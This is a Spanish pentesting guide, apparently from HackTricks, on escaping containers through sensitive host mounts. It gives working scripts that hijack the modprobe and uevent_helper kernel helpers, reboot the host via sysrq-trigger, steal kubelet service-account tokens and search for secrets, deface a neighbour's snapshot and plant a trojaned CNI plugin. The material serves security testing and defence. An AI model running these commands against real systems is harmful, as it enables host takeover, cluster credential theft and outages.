# Montajes sensibles del host

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Los montajes del host son una de las superficies prácticas más importantes para escapar de contenedores, porque a menudo deshacen el aislamiento cuidadoso de la vista de procesos y vuelven a exponer directamente los recursos del host. Los casos peligrosos no se limitan a `/`. Los bind mounts de `/proc`, `/sys`, `/var`, los sockets del runtime, el estado gestionado por kubelet o las rutas relacionadas con dispositivos pueden exponer controles del kernel, credenciales, sistemas de archivos de contenedores vecinos e interfaces de gestión del runtime.

Esta página existe por separado de las páginas individuales sobre protección porque el modelo de abuso abarca varios ámbitos. Un montaje de host con permisos de escritura es peligroso en parte por los mount namespaces, en parte por los user namespaces, en parte por la cobertura de AppArmor o SELinux y en parte por la ruta exacta del host que se expuso. Tratarlo como un tema independiente facilita mucho el análisis de la superficie de ataque.

Compara también un directorio del host con permisos de escritura con la ruta correspondiente dentro de cada contenedor. Si está montado sobre un directorio de scripts ejecutables de inicio, un usuario del host con menos privilegios podría insertar código que un entrypoint del contenedor con más privilegios cargue en el siguiente reinicio. Confirma el origen y el destino exactos del bind mount, los permisos de escritura y búsqueda del directorio, el bucle del entrypoint y el requisito de que el archivo sea ejecutable, el UID del runtime y que exista un mecanismo real que provoque el reinicio. El UID 0 del contenedor no equivale automáticamente al UID 0 del host; el mapeo de user namespaces y la política de montaje determinan el efecto en el host. Una revisión pasiva debe informar las rutas y los permisos sin escribir un script ni reiniciar la carga de trabajo.

Un contenedor Linux puede ejecutarse dentro de una VM de gestión que comparte parte del sistema de archivos de un host Windows independiente. [VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) son una forma de hacer visibles los archivos del host en un guest, pero root en esa VM sigue siendo una identidad distinta de la de un administrador de Windows. Si el recurso compartido expone la clave privada SSH legible de un usuario, trátala como una pista sobre credenciales: verifica el montaje exacto respaldado por el host, la propiedad y el acceso a la clave, la cuenta correspondiente y la política **efectiva** de claves autorizadas del servidor SSH de Windows antes de concluir que permite iniciar sesión en el host. El [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) moderno suele usar un archivo `administrators_authorized_keys` independiente para las cuentas de administrador. No incluyas el contenido de claves privadas en la salida de enumeración habitual; los metadatos del montaje y de la ruta de la clave bastan para una evaluación pasiva.

## Exposición de `/proc`

procfs contiene tanto información habitual de procesos como interfaces de control del kernel de gran impacto. Por ello, un bind mount como `-v /proc:/host/proc` o una vista del contenedor que exponga entradas inesperadas de proc con permisos de escritura puede provocar una divulgación de información, una denegación de servicio o la ejecución directa de código en el host.

Las rutas de procfs de alto valor incluyen:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (especialmente `register` y `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Empieza comprobando qué entradas de procfs de alto valor son visibles o tienen permisos de escritura:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Estas rutas son interesantes por diferentes motivos. `core_pattern`, `modprobe` y `binfmt_misc` pueden convertirse en rutas de ejecución de código en el host cuando tienen permisos de escritura. `kallsyms`, `kmsg`, `kcore` y `config.gz` son potentes fuentes de reconocimiento para la explotación del kernel. `sched_debug` y `mountinfo` revelan información sobre procesos, cgroups y sistemas de archivos que puede ayudar a reconstruir la disposición del host desde dentro del contenedor.

El valor práctico de cada ruta es diferente, y tratarlas a todas como si tuvieran el mismo impacto dificulta la clasificación:

- `/proc/sys/kernel/core_pattern`
  Si tiene permisos de escritura, esta es una de las rutas de procfs de mayor impacto, porque el kernel ejecutará un pipe handler después de un fallo. Un contenedor que pueda apuntar `core_pattern` a un payload almacenado en su overlay o en una ruta montada del host a menudo puede obtener ejecución de código en el host. Consulta también [read-only-paths.md](protections/read-only-paths.md) para ver un ejemplo específico.
- `/proc/sys/kernel/modprobe`
  Esta ruta controla el helper de userspace que utiliza el kernel cuando necesita invocar la lógica de carga de módulos. Si el contenedor puede modificarla y se interpreta en el contexto del host, puede convertirse en otra primitiva de ejecución de código en el host. Es especialmente interesante si se combina con una forma de activar la ruta del helper.
- `/proc/sys/vm/panic_on_oom`
  Normalmente no es una primitiva de escape limpia, pero puede convertir la presión de memoria en una denegación de servicio a escala del host al hacer que las condiciones OOM provoquen un kernel panic.
- `/proc/sys/fs/binfmt_misc`
  Si se puede escribir en la interfaz de registro, el atacante puede registrar un handler para un valor magic elegido y obtener ejecución en el contexto del host cuando se ejecute un archivo coincidente.
- `/proc/config.gz`
  Útil para clasificar exploits del kernel. Permite determinar qué subsistemas, mitigaciones y funciones opcionales del kernel están habilitados sin necesitar metadatos de paquetes del host.
- `/proc/sysrq-trigger`
  Principalmente una ruta de denegación de servicio, pero muy grave. Puede reiniciar, provocar un panic o interrumpir el host de inmediato de otras maneras.
- `/proc/kmsg`
  Revela mensajes del ring buffer del kernel. Es útil para fingerprinting del host, análisis de fallos y, en algunos entornos, para filtrar información útil para la explotación del kernel.
- `/proc/kallsyms`
  Es valiosa cuando se puede leer, porque expone información sobre los símbolos exportados del kernel y puede ayudar a sortear las suposiciones de aleatorización de direcciones durante el desarrollo de exploits del kernel.
- `/proc/[pid]/mem`
  Es una interfaz directa a la memoria de los procesos. Si se puede acceder al proceso objetivo y se cumplen las condiciones necesarias de tipo ptrace, puede permitir leer o modificar la memoria de otro proceso. El impacto real depende en gran medida de las credenciales, `hidepid`, Yama y las restricciones de ptrace, así que es una ruta potente, pero condicionada.
- `/proc/kcore`
  Expone una vista de la memoria del sistema similar a una imagen de core. El archivo es enorme y complicado de usar, pero si se puede leer de forma significativa, indica una exposición grave de la memoria del host.
- `/dev/kmem` y `/dev/mem`
  Históricamente, son interfaces de **dispositivo** de alto impacto para acceder a la memoria sin procesar, no archivos de procfs. En muchos sistemas modernos no existen o están muy restringidas, pero un contenedor que pueda abrir una copia montada desde el host debería tratar esta exposición como crítica. Revísalas junto con otros montajes sensibles de `/dev`, en lugar de buscar las rutas inexistentes `/proc/kmem` o `/proc/mem`.
- `/proc/sched_debug`
  Filtra información sobre la planificación y las tareas que puede revelar la identidad de procesos del host, incluso cuando otras vistas de procesos parecen más limpias de lo esperado.
- `/proc/[pid]/mountinfo`
  Es extremadamente útil para reconstruir dónde reside realmente el contenedor en el host, qué rutas están respaldadas por overlay y si un montaje con permisos de escritura corresponde a contenido del host o solo a la capa del contenedor.

Si se puede leer `/proc/[pid]/mountinfo` o los detalles del overlay, úsalos para recuperar la ruta del host correspondiente al sistema de archivos del contenedor:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Estos comandos son útiles porque varios trucos de ejecución en el host requieren convertir una ruta dentro del contenedor en la ruta correspondiente desde la perspectiva del host.

### Ejemplo: Preparar una ruta para un helper de `modprobe`

Si se puede escribir en `/proc/sys/kernel/modprobe` desde el contenedor y la ruta del helper se interpreta en el contexto del host, se puede redirigir a un payload controlado por el atacante. El directorio upper de overlay debe resolverse desde el host, y la salida de prueba debe escribirse en esa misma capa del contenedor visible desde el host si el contenedor no monta también el `/tmp` del host:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

El trigger exacto depende del objetivo y del comportamiento del kernel, y no se adivina deliberadamente. Restaura el valor original antes de salir del laboratorio. Lo importante es que una ruta auxiliar con permisos de escritura puede redirigir una futura invocación del helper del kernel a contenido de una ruta del host controlado por el atacante. La ausencia de un `upperdir` de overlay, una ruta que el host no pueda resolver, un mount de sysctl de solo lectura o un kernel que nunca invoque el helper seleccionado interrumpen esta cadena.

### Ejemplo completo: Kernel Recon con `kallsyms`, `kmsg` y `config.gz`

Si el objetivo es evaluar la explotabilidad en lugar de escapar de inmediato:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Estos comandos ayudan a determinar si hay información útil sobre símbolos visible, si los mensajes recientes del kernel revelan un estado interesante y qué funciones o mitigaciones del kernel están compiladas. El impacto normalmente no es un escape directo, pero puede acelerar considerablemente la clasificación de vulnerabilidades del kernel.

### Ejemplo completo: reinicio del host mediante SysRq

Si `/proc/sysrq-trigger` permite escritura y accede a la vista del host:

```bash
echo b > /proc/sysrq-trigger
```

El efecto es un reinicio inmediato del host. No es un ejemplo sutil, pero demuestra claramente que la exposición de procfs puede ser mucho más grave que la divulgación de información.

## Exposición de `/sys`

sysfs expone grandes cantidades de estado del kernel y de los dispositivos. Algunas rutas de sysfs son principalmente útiles para el fingerprinting, mientras que otras pueden afectar la ejecución de helpers, el comportamiento de los dispositivos, la configuración de los módulos de seguridad o el estado del firmware.

Entre las rutas de sysfs de alto valor se incluyen:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Estas rutas importan por distintos motivos. `/sys/class/thermal` puede influir en el comportamiento de la gestión térmica y, por tanto, en la estabilidad del host en entornos con una exposición deficiente. `/sys/kernel/vmcoreinfo` puede filtrar información sobre volcados de fallos y la disposición del kernel que ayuda al fingerprinting de bajo nivel del host. `/sys/kernel/security` es la interfaz `securityfs` que usan los Linux Security Modules, por lo que un acceso inesperado puede exponer o alterar el estado relacionado con MAC. Las rutas de variables EFI pueden afectar a la configuración de arranque respaldada por el firmware, lo que las hace mucho más graves que los archivos de configuración ordinarios. `debugfs`, en `/sys/kernel/debug`, es especialmente peligroso porque es una interfaz orientada a desarrolladores, diseñada intencionalmente con muchas menos expectativas de seguridad que las API del kernel reforzadas y destinadas a producción.

Cada entrada de sysfs de esta lista depende del **kernel, la configuración y el hardware**. Los nodos virtualizados actuales suelen omitir por completo `uevent_helper`, las variables EFI y las entradas de dispositivos térmicos. Registra una ruta ausente como un requisito previo negativo en lugar de asumir que un ejemplo de otro kernel también se aplica.

Los comandos útiles para revisar estas rutas son:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Qué hace interesantes esos comandos:

- `/sys/kernel/security` puede revelar si AppArmor, SELinux u otra superficie de LSM es visible de una forma que debería haberse mantenido exclusiva del host.
- `/sys/kernel/debug` suele ser el hallazgo más alarmante de este grupo. Si `debugfs` está montado y se puede leer o escribir en él, cabe esperar una amplia superficie de interacción con el kernel cuyo riesgo exacto depende de los nodos de depuración habilitados.
- La exposición de variables EFI es menos común, pero tiene un impacto alto si se da, porque afecta a configuraciones respaldadas por el firmware, en lugar de a archivos normales del sistema en ejecución.
- `/sys/class/thermal` es relevante principalmente para la estabilidad del host y la interacción con el hardware, no para una escapatoria sencilla desde la shell.
- `/sys/kernel/vmcoreinfo` es principalmente una fuente para identificar el host y analizar fallos, útil para comprender el estado interno del kernel.

### Ejemplo completo: `uevent_helper`

`/sys/kernel/uevent_helper` depende del kernel y de su configuración, y no existe en muchos sistemas actuales. Si existe, permite escritura y hay un disparador `uevent` utilizable, el kernel puede ejecutar un helper controlado por un atacante. La salida de prueba debe usar una ruta visible tanto desde el host como desde el contenedor:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

La razón por la que esto funciona es que la ruta del helper se interpreta desde el punto de vista del host. Una vez activado, el helper se ejecuta en el contexto del host y no dentro del contenedor actual. `/sys/class/mem/null/uevent` es un trigger concreto en kernels que lo exponen; otros dispositivos pueden exponer sus propios archivos `uevent`, pero no elijas uno a ciegas en hardware real. Restaura el valor original antes de salir del laboratorio. No informes que esta técnica está disponible si no existe el archivo helper o un trigger controlado.

## Exposición de `/var`

Montar el `/var` del host en un contenedor suele subestimarse porque no parece tan drástico como montar `/`. En la práctica, puede bastar para acceder a sockets runtime, directorios de snapshots de contenedores, volúmenes de pods gestionados por kubelet, tokens de cuentas de servicio proyectados y sistemas de archivos de aplicaciones vecinas. En los nodos modernos, `/var` suele ser donde realmente se encuentra el estado de contenedores más interesante desde el punto de vista operativo.

### Ejemplo de Kubernetes

Un pod con `hostPath: /var` a menudo puede leer los tokens proyectados de otros pods y el contenido de los snapshots overlay:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Estos comandos son útiles porque permiten determinar si el montaje expone solo datos de aplicación sin importancia o credenciales de clúster de alto impacto. Un token de cuenta de servicio legible puede convertir de inmediato la ejecución de código local en acceso a la API de Kubernetes.

Si el token está presente, valida a qué puede acceder en lugar de detenerte al descubrirlo:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

El impacto aquí puede ser mucho mayor que el acceso al nodo local. Un token con permisos RBAC amplios puede convertir un `/var` montado en un compromiso de todo el clúster.

### Ejemplo de Docker y containerd

En los hosts Docker, los datos relevantes suelen estar en `/var/lib/docker`, mientras que en los nodos de Kubernetes respaldados por containerd pueden estar en `/var/lib/containerd` o en rutas específicas del snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Si el `/var` montado expone contenido de snapshots modificable de otra carga de trabajo, el atacante podría alterar archivos de aplicaciones, colocar contenido web o cambiar scripts de inicio sin tocar la configuración del contenedor actual.

En una **carga de trabajo de laboratorio desechable**, el contenido modificable de un snapshot puede demostrar la manipulación de aplicaciones, la recuperación de secretos o el movimiento lateral. Primero relaciona el ID del contenedor en tiempo de ejecución con el snapshot exacto y nunca edites un snapshot ajeno o de producción:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Estos comandos son útiles porque muestran las tres principales categorías de impacto de montar `/var`: manipulación de aplicaciones, recuperación de secretos y movimiento lateral hacia cargas de trabajo vecinas.

Las escrituras directas en snapshots eluden la gestión de estado normal del runtime y pueden corromper el contenedor o destruir evidencia. El descubrimiento de solo lectura se reprodujo localmente con `overlay2` de Docker: un marcador escrito en un contenedor desechable vecino apareció debajo de `/var/lib/docker/overlay2/<id>/diff/`. Limita la modificación real de snapshots a un contenedor desechable creado para esa prueba.

## Rutas de estado de Kubelet, plugins y CNI

A menudo, los montajes de `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` están expuestos a través de DaemonSets privilegiados, agentes CNI, plugins de nodo CSI, operadores de GPU y utilidades de almacenamiento. Es fácil restarles importancia y considerarlos «infraestructura del nodo», pero están directamente en la ruta de ejecución de los pods nuevos y suelen contener credenciales de kubelet, secretos proyectados, sockets de registro y binarios ejecutables de plugins del host.

Entre los objetivos de alto valor se incluyen:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Los comandos útiles para revisar son:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Por qué importan estas rutas:

- `/var/lib/kubelet/pki` puede exponer certificados de cliente de kubelet y otras credenciales locales del nodo que, en ocasiones, pueden reutilizarse contra el API server o endpoints TLS accesibles desde kubelet, según el diseño del clúster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` suele contener tokens de service account proyectados y Secrets montados para pods vecinos en el mismo nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` es principalmente una superficie de reconnaissance, pero muy útil: revela qué pods y contenedores poseen actualmente GPUs, hugepages, dispositivos SR-IOV y otros recursos escasos locales del nodo.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` y `/var/lib/kubelet/plugins_registry` revelan qué plugins CSI, DRA y de dispositivos están instalados, y con qué sockets se espera que se comunique kubelet. Si se puede escribir en esos directorios, en lugar de solo leerlos, el hallazgo es mucho más grave.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` y `/etc/cni/net.d` están directamente en la ruta de configuración de la red de los pods. El acceso de escritura allí suele ser una primitiva de ejecución en el host diferida, más que una simple exposición de la configuración.<sup>[[2]](#references)</sup>

### Ejemplo completo: `/opt/cni/bin` con permisos de escritura

Si un directorio de binarios CNI del host está montado con permisos de lectura y escritura, reemplazar un plugin puede bastar para obtener ejecución en el host la próxima vez que kubelet cree un sandbox de pod en ese nodo:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Esto no es tan inmediato como un `docker.sock` montado, pero suele ser más realista en pods de infraestructura de Kubernetes comprometidos. El marcador se escribe junto al plugin montado para que el contenedor pueda recuperarlo incluso sin un montaje de host-root o de host-`/tmp`. El wrapper conserva los argumentos originales y la entrada estándar, y luego el ejemplo restaura el binario original. Lo importante es que el host ejecuta después el binario modificado durante el flujo de configuración de red, no el contenedor actual. Usa únicamente un nodo desechable, ya que un wrapper no válido puede impedir que los nuevos sandboxes de Pod reciban conectividad de red.

## Sockets de runtime

Los montajes sensibles del host suelen incluir sockets de runtime en lugar de directorios completos. Son tan importantes que vale la pena repetirlos explícitamente aquí:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Consulta [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para ver los exploitation flows completos una vez que se monte uno de estos sockets.

Como patrón rápido para una primera interacción:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Si uno de estos métodos tiene éxito, el camino desde un «socket montado» hasta «iniciar un contenedor hermano con más privilegios» suele ser mucho más corto que cualquier ruta para escapar del kernel.

El mismo acceso al daemon también puede establecer **persistencia en el host**. Un contenedor auxiliar con un montaje bind de la raíz del host con permisos de escritura puede recibir archivos mediante `docker cp` y luego usar `docker exec` para colocar una clave SSH, una unidad de servicio u otro archivo de persistencia en la ruta montada del host. El límite de seguridad es la autoridad del daemon para crear el montaje del host; `docker cp` es solo un paso de preparación. Audita tanto los contenedores recién creados como las escrituras en rutas de autenticación o inicio del host después de exponer un socket del runtime.

## Writable Host Path Task Hijack

Un montaje del host con permisos de escritura no necesita exponer `/` para ser peligroso. Si la ruta montada contiene scripts, archivos de configuración, hooks, plugins o archivos que luego consume una tarea programada o un servicio del host, el contenedor podría cambiar lo que ejecuta el host.

Flujo genérico de revisión:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Si un archivo con permisos de escritura es utilizado por un proceso del host, mantén el payload simple y observable durante las pruebas:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

La parte interesante es el límite de confianza: la escritura se realiza desde dentro del contenedor, pero la ejecución ocurre más tarde en el contexto del servicio del host. Esto convierte un hostPath o bind mount limitado en una primitiva de ejecución de código en el host diferida.

## Archivos propiedad de root en una ruta compartida del host

Una cuenta del contenedor que pueda convertirse en root quizá pueda colocar un archivo propiedad de root en una ruta escribible que también use el host. Si el UID 0 del contenedor se asigna al UID 0 del host, ambas vistas hacen referencia al mismo archivo y el montaje del host permite la ejecución de SUID, un usuario del host que pueda ejecutar un ejecutable SUID propiedad de root en esa ruta podría cruzar el límite de privilegios del host. Para este problema específico de propiedad de archivos, el contenedor no tiene que ejecutarse con `--privileged`. Consulta [user namespace mappings](protections/namespaces/user-namespace.md) y la [discusión sobre SUID](privileged-containers.md) para conocer las condiciones independientes.

Revisa la ruta desde **ambos lados**: compara la propiedad e identidad de un archivo inocuo, comprueba `uid_map` y `gid_map` del contenedor e inspecciona las opciones de montaje y la política de ejecución del host. Un `rw` desde el contenedor sin `nosuid` solo es un indicio; no permite determinar la propiedad en el host, las flags de montaje del host, el acceso de un usuario del host ni si AppArmor/SELinux bloquea la ejecución. `noexec` restringe la ejecución en la vista donde se aplica. Las etiquetas `shared:` y `master:` de `/proc/self/mountinfo` describen la propagación del montaje, no si el contenido del archivo se comparte con el host. Un bind mount puede no tener esas etiquetas. La reutilización de credenciales que proporciona un inicio de sesión en el host es un paso independiente del límite de privilegios que supone el archivo compartido.

El almacenamiento de runtime del host puede crear una ruta similar incluso sin un bind mount explícito. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) permitió a un usuario sin privilegios del host recorrer subdirectorios de datos de Docker y ejecutar archivos de un sistema de archivos de contenedor; Moby corrigió los permisos en 20.10.9 e indica que hay que reiniciar los contenedores en ejecución para corregir sus directorios. Revisa las rutas exactas de `overlay2/<id>/merged` montadas y los permisos de búsqueda de cada directorio padre; luego determina si el UID 0 del contenedor se asigna al UID 0 del host, si hay un ejecutable SetUID real propiedad de root presente y accesible, y si la vista del host permite la ejecución de SetUID. Los contenedores rootless o con user-namespace-remapped, `nosuid`, `noexec`, `no_new_privs` y la política MAC pueden cambiar el resultado. La versión del runtime o una ruta recorrible por sí solas son indicios para revisar, no una prueba de ejecución como root en el host; inspecciona los metadatos del montaje y del archivo sin ejecutar ningún posible candidato.

## CVE relacionadas con montajes

Los montajes del host también pueden verse afectados por vulnerabilidades del runtime. Algunos ejemplos recientes importantes:

- `CVE-2024-21626` en `runc`, donde un descriptor de archivo de directorio filtrado podía colocar el directorio de trabajo en el sistema de archivos del host.
- `CVE-2024-23651`, `CVE-2024-23652` y `CVE-2024-23653` en BuildKit, donde Dockerfiles maliciosos, frontends y flujos `RUN --mount` podían volver a permitir el acceso a archivos del host, su eliminación o la elevación de privilegios durante las compilaciones.
- `CVE-2024-1753` en flujos de compilación de Buildah y Podman, donde bind mounts manipulados durante la compilación podían exponer `/` con permisos de lectura y escritura.
- `CVE-2025-47290` en `containerd` 2.1.0, donde una condición TOCTOU durante la descompresión de imágenes podía permitir que una imagen especialmente manipulada modificara el sistema de archivos del host durante la descarga.

Estas CVE son relevantes porque muestran que la gestión de montajes no depende únicamente de la configuración del operador. El propio runtime también puede introducir condiciones de escape causadas por montajes.

## Comprobaciones

Usa estos comandos para localizar rápidamente las exposiciones de montaje de mayor valor:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Qué resulta interesante aquí:

- El root del host, `/proc`, `/sys`, `/var` y los sockets de runtime son hallazgos de alta prioridad.
- Las entradas de proc/sys con permisos de escritura suelen indicar que el mount expone controles del kernel globales del host, en lugar de una vista segura del contenedor.
- Las rutas de `/var` montadas merecen una revisión de credenciales y cargas de trabajo vecinas, no solo del sistema de archivos.
- Los directorios de estado de Kubelet y las rutas de CNI/plugins merecen la misma prioridad que los sockets de runtime, porque suelen estar directamente en la ruta de creación de pods y distribución de credenciales del nodo.

## Estado de validación local

Las cadenas prácticas de esta página se comprobaron en un nodo local de Linux minikube. La validación reprodujo:

- acceso de lectura y escritura mediante un `hostPath` temporal con permisos de escritura
- descubrimiento de tokens de ServiceAccount proyectados y Secrets montados a través de `/var/lib/kubelet/pods`
- autenticación correcta en la API de Kubernetes con un token activo recuperado de ese estado de Kubelet montado
- descubrimiento de solo lectura de un sistema de archivos `overlay2` de Docker de una carga de trabajo vecina a través de `/var` montado
- creación de un contenedor hermano mediante la API de Docker con un bind del host de solo lectura a través de un `docker.sock` montado
- ejecución diferida en el host mediante un hook temporal consumido por el host
- una simulación de un wrapper de CNI que conservó los argumentos, la entrada estándar y la ejecución del plugin original

El mismo nodo exponía `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` y `config.gz`, pero no exponía `uevent_helper`, variables EFI, entradas térmicas ni `sched_debug`. No se ejecutaron activadores destructivos del kernel. Esto confirma que las cadenas de root del host, `/var`, estado de Kubelet, sockets y consumidores del host son reproducibles, mientras que las técnicas con helpers de procfs/sysfs deben depender del kernel exacto, el modo de montaje, la ruta del payload y el activador.

## References

- [1] [Archivos y rutas locales utilizados por Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [El contenedor cilium-agent puede acceder al host mediante un mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
